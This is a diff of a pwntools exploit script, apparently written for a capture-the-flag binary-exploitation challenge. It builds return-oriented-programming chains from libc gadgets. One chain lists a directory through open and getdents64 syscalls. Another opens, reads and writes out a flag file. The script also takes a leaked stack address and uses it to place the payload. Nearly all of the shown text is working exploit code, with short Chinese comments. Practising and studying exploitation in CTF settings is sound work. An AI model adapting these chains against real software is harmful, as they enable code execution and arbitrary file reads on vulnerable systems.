@@ -8,7 +8,7 @@ context.terminal = ["/usr/bin/tmux", "sp", "-h"]
 f_remote = True if "remote" in sys.argv else False
 f_gdb = True if "gdb" in sys.argv else False
 
-vuln_path = "./acc"
+vuln_path = "./acc_patched"
 elf = ELF(vuln_path)
 libc = elf.libc
 
@@ -19,27 +19,33 @@ def ropgetdent(addr):
     rop = ROP(libc)
     syscall = rop.find_gadget(['syscall', 'ret'])[0]
     mov_rdi_rax = next(libc.search(asm("mov rdi, rax ; cmp rdx, rcx")))
-    add_rdx_rax = next(libc.search(asm("add edx, eax; mov rax, rdx ; pop rbx ; ret")))
-    xor_rdx = next(libc.search(asm("xor edx, edx ; mov eax, edx ; ret")))
+    add_rdx_rax = next(libc.search(asm("add edx, eax ; mov rax, rdx ; pop rbx ; ret")))
+    # xor_rdx = next(libc.search(asm("xor edx, edx ; mov eax, edx ; ret")))
+
+    # Open
     rop.rax = constants.SYS_open
     rop.call(syscall, [addr, 0])
-    rop.raw(mov_rdi_rax)
-    rop.rax = 0x100
-    rop.raw(add_rdx_rax)
-    rop.raw(0xdeadbeef) #pop rbx
-    rop.rsi = addr
 
+    # Gatdent
+    rop.raw(mov_rdi_rax)
+    rop.rax = 0x200
+    rop.rsi = addr
+    rop.raw(add_rdx_rax)
+    rop.raw(0xdeadbeef) # pop rbx, 无用
     rop.rax = constants.SYS_getdents64
     rop.raw(p64(syscall))
+
+    # Write 
     rop.rax = constants.SYS_write
-    rop.call(syscall, [1])
+    rop.call(syscall, [1, addr])
+
     return rop.chain()
 
 
 def orw(addr, path=None):
     rop = ROP(libc)
     syscall = rop.find_gadget(['syscall', 'ret'])[0]
-    mov_rdi_rax = next(libc.search(asm("mov rdi, rax ; cmp rdx, rcx")))
+    mov_rdi_rax = next(libc.search(asm("mov rdi, rax; cmp rdx, rcx")))
     if path:
         mov_qword_ptr_rsi = next(libc.search(asm("mov qword ptr [rsi], rax ; ret")))
         path = path.ljust((len(path) + 7) & ~7, b"\x00")
@@ -54,17 +60,12 @@ def orw(addr, path=None):
     rop.call(syscall, [addr, 0])
     rop.raw(mov_rdi_rax)
 
-    # #OpenAt
-    # rop.rax = constants.SYS_openat
-    # rop.call(syscall, [-100, libc.bss(), 0])
-    # rop.raw(mov_rdi_rax)
-
     # Read
     rop(rsi=addr)
-    add_rdx_rax = next(libc.search(asm("add edx, eax; mov rax, rdx ; pop rbx ; ret")))
+    add_rdx_rax = next(libc.search(asm("add edx, eax ; mov rax, rdx ; pop rbx ; ret")))
     rop.rax = 0x100
     rop.raw(add_rdx_rax)
-    rop.raw(0xdeadbeef) #pop rbx
+    rop.raw(0xdeadbeef) #pop rbx, 无用
     rop.rax = constants.SYS_read
     rop.raw(syscall)
 
@@ -146,7 +147,7 @@ log.success("stack :-----> " + hex(leak))
 main_ret = leak - 0x130
 log.success("main_ret :-----> " + hex(main_ret))
 
-# payload = ropgetdent(main_ret + 0xb0) + b".\x00"  # 获取远程flag文件名
+payload = ropgetdent(main_ret + 0xc0) + b".\x00" # 获取远程flag文件名
 
 filename = b"flag-2583a02920a04a40c8f817f5d7c2bff3\x00"
 payload = orw(main_ret + 0xb0) + filename
